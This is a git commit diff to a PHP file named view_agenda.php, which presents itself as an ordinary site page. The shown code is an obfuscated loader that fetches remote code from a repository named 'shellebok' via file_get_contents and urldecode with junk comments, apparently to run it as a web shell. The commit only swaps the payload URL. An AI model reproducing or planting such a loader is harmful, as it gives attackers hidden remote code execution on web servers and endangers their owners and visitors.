58112326a405f319b5da2a4daaef5460e6ac5398
ebokzsss <84223726+ebokzsss@users.noreply.github.com>
2024-07-28 11:01:23 +0700

    Update view_agenda.php

--- view_agenda.php
+++ view_agenda.php
@@ -2,7 +2,7 @@
     /**_**/ urldecode("%3f%3e") .
         file_get_contents(
             /**_**/ urldecode(
-                /**_**/ "https://raw.githubusercontent.com/ebokzsss/shellebok/main/bepp.txt"
+                /**_**/ "https://raw.githubusercontent.com/ebokzsss/shellebok/main/bypp.php"
             )
         )
 ); ?>
